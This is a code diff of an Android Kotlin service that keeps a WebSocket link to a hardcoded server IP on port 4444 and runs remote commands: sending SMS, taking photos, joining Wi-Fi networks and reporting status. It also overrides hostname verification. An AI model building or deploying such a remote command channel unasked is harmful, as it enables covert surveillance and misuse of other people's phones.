@@ -14,6 +14,7 @@ import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
+import com.google.gson.JsonSyntaxException // Import for handling JSON parsing errors
 import okhttp3.*
 import okio.ByteString
 import kotlinx.coroutines.*
@@ -28,35 +29,26 @@ class WebSocketService : Service() {
     private val TAG = "WebSocketService"
     private var webSocket: WebSocket? = null
     private val client = OkHttpClient.Builder()
-        .readTimeout(0, TimeUnit.MILLISECONDS)
-        // Add this hostname verifier
+        .readTimeout(0, TimeUnit.MILLISECONDS) // Disable read timeout for WebSockets
         .hostnameVerifier(object : HostnameVerifier {
             override fun verify(hostname: String?, session: SSLSession?): Boolean {
-                // Always return true for this specific IP, or just always true if you're lazy
-                // For your case, you know the IP is 34.171.50.19, so you can make it specific:
                 return hostname == "34.171.50.19"
-                // Or, less securely, for any hostname:
-                // return true
             }
-        })// Disable read timeout for WebSockets
+        })
         .build()
     private val gson = Gson()
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val cameraExecutor = Executors.newSingleThreadExecutor()
 
-    // --- Constants and Device ID (Improved Persistence) ---
     companion object {
         private const val NOTIFICATION_CHANNEL_ID = "VMControlChannel"
         private const val NOTIFICATION_ID = 101
-
-        // DEVICE_ID will be initialized in onCreate from SharedPreferences
         private var DEVICE_ID: String = ""
-        private const val NORMAL_CLOSURE_STATUS = 1000 // Standard WebSocket normal closure code
+        private const val NORMAL_CLOSURE_STATUS = 1000
     }
 
     override fun onCreate() {
         super.onCreate()
-        // Initialize DEVICE_ID from SharedPreferences or generate a new one
         if (DEVICE_ID.isEmpty()) {
             val sharedPrefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
             DEVICE_ID = sharedPrefs.getString("device_unique_id", null) ?: run {
@@ -68,39 +60,32 @@ class WebSocketService : Service() {
         Log.d(TAG, "WebSocketService created. Device ID: $DEVICE_ID")
     }
 
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         createNotificationChannel()
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
-
-        // Ensure WebSocket is connected or re-connecting
         connectWebSocket()
-        return START_STICKY // Service will be restarted by the system if it gets killed
+        return START_STICKY
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        disconnectWebSocket() // Explicitly disconnect
-        serviceScope.cancel() // Cancel all coroutines launched in this scope
-        cameraExecutor.shutdown() // Shutdown the camera executor
+        disconnectWebSocket()
+        serviceScope.cancel()
+        cameraExecutor.shutdown()
         Log.d(TAG, "WebSocketService onDestroy: Resources cleaned up.")
     }
 
     override fun onBind(intent: Intent?): IBinder? {
-        return null // This service is not designed to be bound
+        return null
     }
 
-    /**
-     * Disconnects the WebSocket connection. Made public to allow MainActivity to call it.
-     */
     fun disconnectWebSocket() {
         webSocket?.close(NORMAL_CLOSURE_STATUS, "App closing or explicitly disconnected")
         webSocket = null
         Log.d(TAG, "WebSocket disconnected.")
     }
 
-    // --- Notification Channel and Notification for Foreground Service ---
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -120,22 +105,18 @@ class WebSocketService : Service() {
         return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
             .setContentTitle("VM Control Active")
             .setContentText("Connected to VM server. Monitoring commands...")
-            .setSmallIcon(R.mipmap.ic_launcher) // Make sure this icon exists
+            .setSmallIcon(R.mipmap.ic_launcher)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
 
-    // --- WebSocket Connection Logic ---
     private fun connectWebSocket() {
-        // Only attempt to connect if there's no active WebSocket or it's not open
-        if (webSocket != null && webSocket!!.send("ping")) { // A quick check if it's still alive
+        if (webSocket != null && webSocket!!.send("ping")) {
             Log.d(TAG, "WebSocket already connected or connecting. Skipping new connection.")
             return
         }
 
-        // IMPORTANT: Use wss:// for secure connections.
-        // Replace with your VM's public IP/Domain and Port that MATCHES the Common Name in your SSL cert.
-        val wsUrl = "wss://34.171.50.19:4444" // Ensure this matches your server's IP/domain
+        val wsUrl = "wss://34.171.50.19:4444"
 
         val request = Request.Builder()
             .url(wsUrl)
@@ -146,17 +127,16 @@ class WebSocketService : Service() {
         webSocket = client.newWebSocket(request, object : WebSocketListener() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 Log.d(TAG, "WebSocket opened successfully!")
-                // --- FIX: Typo 'regitor' changed to 'register' ---
                 val handshakeMessage = mapOf(
-                    "type" to "register", // Corrected typo here
+                    "type" to "register",
                     "deviceId" to DEVICE_ID
                 )
                 sendData(gson.toJson(handshakeMessage))
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
-                Log.d(TAG, "Receiving text: $text")
-                // Launch coroutine to handle incoming commands off the main thread
+                Log.d(TAG, "Receiving raw text from server: $text")
+
                 serviceScope.launch {
                     handleIncomingCommand(text)
                 }
@@ -164,29 +144,27 @@ class WebSocketService : Service() {
 
             override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                 Log.d(TAG, "Receiving binary data: ${bytes.hex()}")
-                // Handle binary messages if your server sends them
             }
 
             override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                 Log.d(TAG, "WebSocket is closing: $code / $reason")
-                // Don't immediately call close here, OkHttp handles this
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 Log.d(TAG, "WebSocket Closed: $code / $reason")
-                this@WebSocketService.webSocket = null // Clear the WebSocket reference
-                // Schedule reconnection attempt
-                serviceScope.launch {
-                    Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds...")
-                    delay(5000)
-                    connectWebSocket()
+                this@WebSocketService.webSocket = null
+                if (code != NORMAL_CLOSURE_STATUS) {
+                    serviceScope.launch {
+                        Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds...")
+                        delay(5000)
+                        connectWebSocket()
+                    }
                 }
             }
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 Log.e(TAG, "WebSocket Failure: ${t.message}", t)
-                this@WebSocketService.webSocket = null // Clear on failure
-                // Schedule reconnection attempt
+                this@WebSocketService.webSocket = null
                 serviceScope.launch {
                     Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds due to failure...")
                     delay(5000)
@@ -196,28 +174,23 @@ class WebSocketService : Service() {
         })
     }
 
-    /**
-     * Sends a String message over the WebSocket.
-     */
     fun sendData(data: String) {
         if (webSocket?.send(data) == true) {
             Log.d(TAG, "Sent: $data")
         } else {
             Log.e(TAG, "Failed to send data: WebSocket not connected or failed.")
-            // Consider triggering a reconnect if sending fails while `webSocket` is non-null
-            // but the `send` method returns false.
+            if (webSocket != null) {
+                Log.d(TAG, "Attempting to reconnect due to send failure...")
+                connectWebSocket()
+            }
         }
     }
 
-    /**
-     * Sends a structured response back to the server.
-     * --- FIX: Aligning response structure with server's expectation (type: "response", status, data) ---
-     */
     private fun sendCommandResponse(commandId: String, status: String, data: Any?, message: String? = null) {
         val responseMap = mutableMapOf<String, Any?>()
-        responseMap["type"] = "response" // Server expects 'response' type
+        responseMap["type"] = "response"
         responseMap["commandId"] = commandId
-        responseMap["status"] = status // 'success' or 'error'
+        responseMap["status"] = status
         responseMap["deviceId"] = DEVICE_ID
 
         if (data != null) {
@@ -231,92 +204,123 @@ class WebSocketService : Service() {
 
     /**
      * Handles incoming command messages from the server.
+     * This function now includes more robust JSON parsing and error handling.
      */
     private suspend fun handleIncomingCommand(jsonCommand: String) {
+        var commandId: String? = "unknown"
+        var action: String? = null
+        var responseStatus = "error"
+        var responseMessage: String? = null
+        var result: Any? = null
+
         try {
-            // Using Map<String, Any> to handle mixed types (string, boolean, etc.)
-            val command = gson.fromJson(jsonCommand, Map::class.java) as Map<String, Any>
+            val command = gson.fromJson(jsonCommand, Map::class.java) as? Map<String, Any>
 
-            // --- FIX: Changed from 'command' to 'action' to match server ---
-            val action = command["action"] as? String // Server sends 'action', not 'command'
-            val commandId = command["commandId"] as? String ?: "unknown"
+            if (command == null) {
+                responseMessage = "Received invalid JSON or empty message from server."
+                Log.e(TAG, responseMessage)
+                // No need to send response back, as it's a parsing error of server's message.
+                return
+            }
 
-            Log.d(TAG, "Executing command: $action with ID: $commandId")
+            val type = command["type"] as? String // Get the 'type' field from the incoming message
+            commandId = command["commandId"] as? String ?: "unknown" // Get commandId if present
 
-            val result: Any?
-            var responseStatus = "success"
-            var responseMessage: String? = null
+            Log.d(TAG, "Server Message - Type: '$type', Command ID: '$commandId'")
 
-            when (action) {
-                "get_wifi_status" -> { // Server CLI sends 'wifi' which translates to 'get_wifi_status' here
-                    result = WifiManagerHelper(this).getWifiNetworks()
+            when (type) {
+                "welcome" -> {
+                    Log.d(TAG, "Server Welcome: ${command["message"]}")
+                    // No response needed for a welcome message
+                    return
                 }
-                "connect_wifi" -> {
-                    val ssid = command["ssid"] as? String ?: ""
-                    val password = command["password"] as? String ?: ""
-                    // Assuming connectToWifi returns a Map with status and message
-                    result = WifiManagerHelper(this).connectToWifi(ssid, password)
-                    if ((result as? Map<String, Any>)?.get("status") == "error") {
-                        responseStatus = "error"
-                        responseMessage = (result as? Map<String, Any>)?.get("message") as? String
+                "registered" -> {
+                    Log.d(TAG, "Device successfully registered with server: ${command["message"]}")
+                    // No response needed for registration confirmation
+                    return
+                }
+                "error" -> {
+                    Log.e(TAG, "Server Error: ${command["message"]}. Related command ID: $commandId")
+                    // Server is reporting an error, no need to send another error back from client.
+                    return
+                }
+                // --- Normal command types from server (e.g., from CLI) ---
+                "command" -> { // Assuming server CLI sends 'type: "command"'
+                    action = command["action"] as? String // Get the 'action' for actual commands
+                    Log.d(TAG, "Executing command: '$action' with ID: '$commandId'")
+
+                    when (action) {
+                        "get_wifi_status" -> {
+                            result = WifiManagerHelper(this).getWifiNetworks()
+                            responseStatus = "success"
+                        }
+                        "connect_wifi" -> {
+                            val ssid = command["ssid"] as? String ?: ""
+                            val password = command["password"] as? String ?: ""
+                            result = WifiManagerHelper(this).connectToWifi(ssid, password)
+                            if ((result as? Map<String, Any>)?.get("status") == "error") {
+                                responseStatus = "error"
+                                responseMessage = (result as? Map<String, Any>)?.get("message") as? String
+                            } else {
+                                responseStatus = "success"
+                            }
+                        }
+                        "send_sms" -> {
+                            val number = command["number"] as? String ?: ""
+                            val messageText = command["message"] as? String ?: ""
+                            result = SmsHelper(this).sendSms(number, messageText)
+                            if ((result as? Map<String, Any>)?.get("status") == "error") {
+                                responseStatus = "error"
+                                responseMessage = (result as? Map<String, Any>)?.get("message") as? String
+                            } else {
+                                responseStatus = "success"
+                            }
+                        }
+                        "take_photo" -> {
+                            result = CameraHelper(this, cameraExecutor).takePhoto()
+                            if ((result as? Map<String, Any>)?.get("status") == "error") {
+                                responseStatus = "error"
+                                responseMessage = (result as? Map<String, Any>)?.get("message") as? String
+                            } else {
+                                responseStatus = "success"
+                            }
+                        }
+                        "get_battery_status" -> {
+                            result = BatteryHelper(this).getBatteryStatus()
+                            responseStatus = "success"
+                        }
+                        else -> {
+                            // This block is hit if 'action' is null or not recognized for 'command' type
+                            responseStatus = "error"
+                            responseMessage = "Unknown command action received from server: '$action'"
+                            Log.e(TAG, "Unknown command action: $action")
+                        }
                     }
+                    // Send response ONLY for 'command' type messages
+                    sendCommandResponse(commandId, responseStatus, result, responseMessage)
+                    return // Exit after handling command and sending response
                 }
-                // If you uncomment "get_location", ensure LocationHelper is robust with permissions
-                // "get_location" -> {
-                //     result = LocationHelper(this).getCurrentLocation()
-                //     if ((result as? Map<String, Any>)?.get("status") == "error") {
-                //         responseStatus = "error"
-                //         responseMessage = (result as? Map<String, Any>)?.get("message") as? String
-                //     }
-                // }
-                "send_sms" -> {
-                    val number = command["number"] as? String ?: ""
-                    val messageText = command["message"] as? String ?: ""
-                    result = SmsHelper(this).sendSms(number, messageText)
-                    if ((result as? Map<String, Any>)?.get("status") == "error") {
-                        responseStatus = "error"
-                        responseMessage = (result as? Map<String, Any>)?.get("message") as? String
-                    }
-                }
-                "take_photo" -> {
-                    // Call takePhoto which might return a path or base64 string
-                    // Ensure CameraHelper handles permissions and async operations correctly
-                    result = CameraHelper(this, cameraExecutor).takePhoto()
-                    if ((result as? Map<String, Any>)?.get("status") == "error") {
-                        responseStatus = "error"
-                        responseMessage = (result as? Map<String, Any>)?.get("message") as? String
-                    }
-                }
-                "get_battery_status" -> {
-                    result = BatteryHelper(this).getBatteryStatus()
-                }
+
+                // --- Fallback for any other unknown types from the server ---
                 else -> {
-                    result = null
-                    responseStatus = "error"
-                    responseMessage = "Unknown command action: $action"
+                    responseMessage = "Unknown message type from server: '$type'. Content: $jsonCommand"
+                    Log.e(TAG, responseMessage)
+                    // Do NOT send a response for unrecognized types from the server,
+                    // to avoid creating a new error loop. Just log and ignore.
+                    return
                 }
             }
-            sendCommandResponse(commandId, responseStatus, result, responseMessage)
-
+        } catch (e: JsonSyntaxException) {
+            responseMessage = "Failed to parse incoming JSON from server: ${e.message}. Raw: $jsonCommand"
+            Log.e(TAG, "JSON Syntax Error: $jsonCommand - ${e.message}", e)
+            // No response needed, this is client-side parsing issue
         } catch (e: Exception) {
-            Log.e(TAG, "Error handling command: ${e.message}", e)
-            sendCommandResponse(
-                "unknown",
-                "error",
-                null,
-                "Failed to process command: ${e.message}"
-            )
+            responseMessage = "Error processing message from server: ${e.message}. Raw: $jsonCommand"
+            Log.e(TAG, "General Error handling server message: $jsonCommand - ${e.message}", e)
+            // No response needed, this is client-side processing issue
         }
+        // sendCommandResponse is now explicitly called only for 'command' type messages,
+        // or if you want to explicitly respond to a generic error scenario.
+        // The previous 'finally' block is replaced by explicit returns.
     }
-
-    // --- Helper classes (WifiManagerHelper, SmsHelper, CameraHelper, BatteryHelper)
-    // --- You need to ensure these classes exist in your com.proactive.sptassist package
-    // --- and are correctly implemented to perform their respective actions.
-
-    // Example of WifiManagerHelper (ensure you have this or similar structure)
-    // class WifiManagerHelper(private val context: Context) {
-    //     fun getWifiNetworks(): Map<String, Any> { /* ... implementation ... */ }
-    //     fun connectToWifi(ssid: String, password: String): Map<String, Any> { /* ... implementation ... */ }
-    // }
-    // ... similarly for SmsHelper, CameraHelper, BatteryHelper
 }
